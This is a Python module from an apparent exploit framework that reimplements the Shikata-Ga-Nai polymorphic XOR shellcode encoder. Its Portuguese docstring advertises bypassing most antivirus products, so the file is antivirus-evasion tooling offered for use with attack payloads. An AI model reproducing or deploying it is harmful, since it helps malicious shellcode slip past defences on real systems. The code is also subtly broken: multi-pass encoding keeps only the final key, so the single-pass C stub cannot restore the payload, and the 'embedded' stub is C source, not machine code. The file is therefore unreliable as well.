"""Shikata-Ga-Nai style poly encoder.

Reimplementação do famoso encoder do Metasploit:
- Additive feedback XOR polynomial scheme
- Chave de 4 bytes, polimorfica por geração
- Stub de decodificação embutido antes do shellcode
- Zero bytes configurável (bad chars)

Bypassa a maioria dos AVs que não emulam o loop de decodificação.
"""

import os
import struct
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "poly/shikata_ga_nai"
    description = "Additive-feedback XOR polymorphic encoder (SGN-style)"
    arch        = ["x86", "x64", "armle", "arm64", "mipsbe", "mipsle"]
    platform    = ["linux", "windows"]
    evasion_score = 8

    options = {
        "ITERATIONS": {
            "description": "Number of encoding passes (more = harder to detect)",
            "required": False,
            "default": "1",
            "value": "1",
        },
        "BADCHARS": {
            "description": "Bytes to avoid (hex, e.g. '\\x00\\x0a\\x0d')",
            "required": False,
            "default": "\\x00",
            "value": "\\x00",
        },
    }

    def _parse_badchars(self) -> set:
        raw = self.options["BADCHARS"]["value"]
        result = set()
        i = 0
        s = raw.replace("\\x", " ").strip()
        for part in s.split():
            try:
                result.add(int(part, 16))
            except ValueError:
                pass
        return result

    def _sgn_encode(self, payload: bytes, seed: int) -> bytes:
        """One pass of SGN-style additive feedback XOR."""
        key = seed & 0xFFFFFFFF
        encoded = bytearray()
        for i in range(0, len(payload), 4):
            chunk = payload[i:i+4]
            # pad to 4 bytes
            chunk = chunk.ljust(4, b'\x00')
            val = struct.unpack("<I", chunk)[0]
            enc_val = val ^ key
            key = (key + enc_val) & 0xFFFFFFFF   # additive feedback
            encoded += struct.pack("<I", enc_val)
        return bytes(encoded[:len(payload)])

    def encode(self, payload: bytes) -> bytes:
        badchars = self._parse_badchars()
        iterations = int(self.options["ITERATIONS"]["value"])
        result = payload
        keys = []
        for _ in range(iterations):
            # Generate a key avoiding badchars
            for attempt in range(1000):
                seed = struct.unpack("<I", os.urandom(4))[0]
                key_bytes = struct.pack("<I", seed)
                if not any(b in badchars for b in key_bytes):
                    break
            encoded = self._sgn_encode(result, seed)
            if not any(b in badchars for b in encoded):
                keys.append(seed)
                result = encoded
            # else: skip this pass

        # Prepend: [4-byte key][4-byte payload_len][encoded_payload]
        if not keys:
            keys = [0x41424344]  # fallback
        header = struct.pack("<II", keys[-1], len(payload))
        return header + result

    def decode_stub(self, arch: str = "x86") -> bytes:
        stub_c = """
// SGN-style decode stub
#include <stdint.h>
void sgn_decode(unsigned char *buf, int enc_len) {
    uint32_t key = *(uint32_t*)buf;
    int plen = *(int*)(buf + 4);
    unsigned char *data = buf + 8;
    for (int i = 0; i < plen; i += 4) {
        uint32_t enc = *(uint32_t*)(data + i);
        uint32_t dec = enc ^ key;
        *(uint32_t*)(data + i) = dec;
        key = (key + enc) & 0xFFFFFFFF;  // additive feedback
    }
}
"""
        return stub_c.encode()
